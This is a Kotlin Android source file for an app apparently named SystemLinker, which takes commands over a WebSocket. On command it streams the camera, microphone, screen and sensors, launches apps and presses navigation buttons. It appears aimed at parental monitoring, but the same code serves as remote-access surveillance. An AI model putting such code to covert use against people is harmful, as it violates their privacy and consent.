package com.systemlinker.features

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.*
import okhttp3.*
import okio.ByteString
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * =================================================================================================
 * IMPORTANT: REQUIRED CHANGES IN OTHER FILES FOR THIS TO WORK
 * =================================================================================================
 *
 * 1. In `Constants.kt` -> `Intents`, add these new actions:
 *
 *    const val ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION = "com.systemlinker.UPGRADE_FGS_MP"
 *    const val ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION = "com.systemlinker.DOWNGRADE_FGS_MP"
 *
 *
 * 2. In `SystemLinkerService.kt`, you MUST register a new BroadcastReceiver to handle these actions:
 *
 *    // --- Add this receiver inside your SystemLinkerService class ---
 *    private val fgsUpgradeReceiver = object : BroadcastReceiver() {
 *        override fun onReceive(context: Context?, intent: Intent?) {
 *            when (intent?.action) {
 *                Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION -> {
 *                     // UPGRADE: Add mediaProjection type and restart foreground service
 *                     val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
 *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
 *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
 *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION // ADDED
 *
 *                     startForeground(1001, createNotification(isStreaming = true), serviceTypes)
 *                }
 *                Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION -> {
 *                     // DOWNGRADE: Remove mediaProjection type
 *                     val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
 *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
 *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION // REMOVED
 *
 *                     startForeground(1001, createNotification(isStreaming = false), serviceTypes)
 *                }
 *            }
 *        }
 *    }
 *
 *    // --- In `onCreate()` of SystemLinkerService, register the receiver ---
 *    val filter = IntentFilter().apply {
 *        addAction(Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION)
 *        addAction(Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION)
 *    }
 *    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
 *        registerReceiver(fgsUpgradeReceiver, filter, RECEIVER_NOT_EXPORTED)
 *    } else {
 *        registerReceiver(fgsUpgradeReceiver, filter)
 *    }
 *
 *    // --- In `onDestroy()` of SystemLinkerService, unregister it ---
 *    unregisterReceiver(fgsUpgradeReceiver)
 *
 *
 *    // --- Optional: Modify createNotification() to show streaming status ---
 *    private fun createNotification(isStreaming: Boolean = false): Notification {
 *         val text = if (isStreaming) "Live screen streaming active." else Constants.Service.NOTIFICATION_TEXT
 *         return NotificationCompat.Builder(this, Constants.Service.NOTIFICATION_CHANNEL_ID)
 *             .setContentTitle(Constants.Service.NOTIFICATION_TITLE)
 *             .setContentText(text)
 *             // ... rest of builder
 *             .build()
 *     }
 * =================================================================================================
 */
class LiveSessionManager(private val context: Context) : WebSocketListener() {

    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .pingInterval(10, TimeUnit.SECONDS)
        .build()
        
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isStreamingSensors = false
    private var sensorManager: SensorManager? = null

    private val audioStreamer = AudioStreamer { bytes -> sendBinary(bytes) }
    private val screenStreamer = ScreenStreamer(context) { bytes -> sendBinary(bytes) }
    private val cameraStreamer = CameraStreamer(context) { bytes -> sendBinary(bytes) }

    private val systemDataReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                "com.systemlinker.SCREEN_DATA" -> {
                    intent.getStringExtra("json")?.let { webSocket?.send(it) }
                }
                "com.systemlinker.SCREEN_CAST_CONSENT" -> {
                    val code = intent.getIntExtra("code", 0)
                    val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra("data", Intent::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra("data")
                    }

                    if (data != null && context != null) {
                        // ** CRASH FIX FOR ANDROID 14+ **
                        // We must first command the service to "upgrade" its Foreground Service type
                        // to include mediaProjection BEFORE we start streaming.
                        scope.launch {
                            // 1. Send the broadcast command to SystemLinkerService.
                            val upgradeIntent = Intent("com.systemlinker.UPGRADE_FGS_MP")
                            context.sendBroadcast(upgradeIntent)

                            // 2. Give the service a moment to process the FGS upgrade.
                            // Without this, startStreaming might be called before the OS acknowledges the change.
                            delay(500)

                            // 3. Now it is safe to start the screen stream.
                            screenStreamer.startStreaming(code, data)
                            sendJson(JSONObject().put("status", "screen_cast_started"))
                        }
                    }
                }
                "com.systemlinker.SCREEN_CAST_CONSENT_DENIED" -> {
                    sendJson(JSONObject().put("error", "Screen cast consent denied by user."))
                }
            }
        }
    }

    fun connect(wsUrl: String) {
        if (webSocket != null) return
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, this)
        
        val filter = IntentFilter().apply {
            addAction("com.systemlinker.SCREEN_DATA")
            addAction("com.systemlinker.SCREEN_CAST_CONSENT")
            addAction("com.systemlinker.SCREEN_CAST_CONSENT_DENIED")
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(systemDataReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(systemDataReceiver, filter)
        }
    }

    fun disconnect() {
        stopSensorStream()
        audioStreamer.stopAll()
        cameraStreamer.stopStreaming()
        
        // Check if screen streamer is running and command a service downgrade if it is.
        if (screenStreamer.isStreaming) {
            screenStreamer.stopStreaming()
            val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
            context.sendBroadcast(downgradeIntent)
        }
        
        val intent = Intent("com.systemlinker.ACC_ACTION")
        intent.putExtra("action", "stream_screen_stop")
        context.sendBroadcast(intent)
        
        try { context.unregisterReceiver(systemDataReceiver) } catch (e: Exception) {}
        
        webSocket?.close(1000, "Parent closed session")
        webSocket = null
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        sendJson(JSONObject().put("status", "connected").put("device", Build.MODEL))
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        try {
            val json = JSONObject(text)
            handleLiveCommand(json)
        } catch (e: Exception) {
            ErrorLogger.logError(context, "LiveSession_Parse", e)
        }
    }

    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
        audioStreamer.playIncomingAudio(bytes.toByteArray())
    }

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        disconnect()
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        disconnect()
        ErrorLogger.logError(context, "LiveSession_Failure", t)
    }

    private fun handleLiveCommand(payload: JSONObject) {
        val cmd = payload.optString("cmd")
        val arg = payload.optString("arg")

        when (cmd) {
            "vibrate" -> vibrateDevice(arg.toLongOrNull() ?: 500L)
            "launch_app" -> launchApp(arg)
            "stream_sensors" -> if (arg == "start") startSensorStream() else stopSensorStream()
            
            "stream_cam_front" -> if (arg == "start") cameraStreamer.startStreaming(true) else cameraStreamer.stopStreaming()
            "stream_cam_back" -> if (arg == "start") cameraStreamer.startStreaming(false) else cameraStreamer.stopStreaming()
            
            "live_screen_cast" -> {
                if (arg == "start") {
                    sendJson(JSONObject().put("status", "requesting_screen_consent"))
                    val intent = Intent(context, ScreenCaptureActivity::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } else {
                    // Stop streaming and tell the service to "downgrade" its FGS type
                    if (screenStreamer.isStreaming) {
                       screenStreamer.stopStreaming()
                       val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
                       context.sendBroadcast(downgradeIntent)
                    }
                    sendJson(JSONObject().put("status", "screen_cast_stopped"))
                }
            }
            
            "live_screen_res" -> {
                val requestedRes = arg.toIntOrNull()
                if (requestedRes != null) {
                    screenStreamer.setResolution(requestedRes)
                    sendJson(JSONObject().put("status", "screen_res_updated").put("resolution", "${requestedRes}p"))
                } else {
                    sendJson(JSONObject().put("error", "Invalid resolution value. Use 240, 360, 480, 720."))
                }
            }

            "btn_home", "btn_back", "btn_recents", "stream_screen_start", "stream_screen_stop" -> {
                val intent = Intent("com.systemlinker.ACC_ACTION")
                intent.putExtra("action", cmd)
                context.sendBroadcast(intent)
            }
            
            "live_audio_mode" -> {
                when (arg) {
                    "call" -> {
                        audioStreamer.switchMode(AudioMode.CALL)
                        sendJson(JSONObject().put("audio_mode", "call_active"))
                    }
                    "play" -> {
                        audioStreamer.switchMode(AudioMode.PLAY_ONLY)
                        sendJson(JSONObject().put("audio_mode", "play_only_active"))
                    }
                    "mic" -> {
                        audioStreamer.switchMode(AudioMode.MIC_ONLY)
                        sendJson(JSONObject().put("audio_mode", "mic_only_active"))
                    }
                    "media" -> {
                        audioStreamer.switchMode(AudioMode.MEDIA_ONLY, null) 
                        sendJson(JSONObject().put("audio_mode", "media_capture_attempted"))
                    }
                    "off" -> {
                        audioStreamer.switchMode(AudioMode.OFF)
                        sendJson(JSONObject().put("audio_mode", "off"))
                    }
                    else -> sendJson(JSONObject().put("error", "Invalid audio mode"))
                }
            }
        }
    }

    private fun sendJson(json: JSONObject) { 
        webSocket?.send(json.toString()) 
    }
    
    private fun sendBinary(bytes: ByteArray) { 
        webSocket?.send(ByteString.of(*bytes)) 
    }

    private fun vibrateDevice(durationMs: Long) {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(durationMs)
        }
    }

    private fun launchApp(packageName: String) {
        try {
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                sendJson(JSONObject().put("status", "app_launched").put("package", packageName))
            }
        } catch (e: Exception) {
            sendJson(JSONObject().put("error", "Launch failed: ${e.message}"))
        }
    }

    private val sensorListener = object : SensorEventListener {
        override fun onSensorChanged(event: SensorEvent) {
            if (!isStreamingSensors) return
            val data = JSONObject().apply {
                put("type", "sensor_data")
                put("sensor", event.sensor.name)
                put("values", event.values.joinToString(","))
            }
            sendJson(data)
        }
        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
    }

    private fun startSensorStream() {
        if (isStreamingSensors) return
        isStreamingSensors = true
        sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        val accel = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        accel?.let { sensorManager?.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_UI) }
    }

    private fun stopSensorStream() {
        isStreamingSensors = false
        sensorManager?.unregisterListener(sensorListener)
        sensorManager = null
    }
}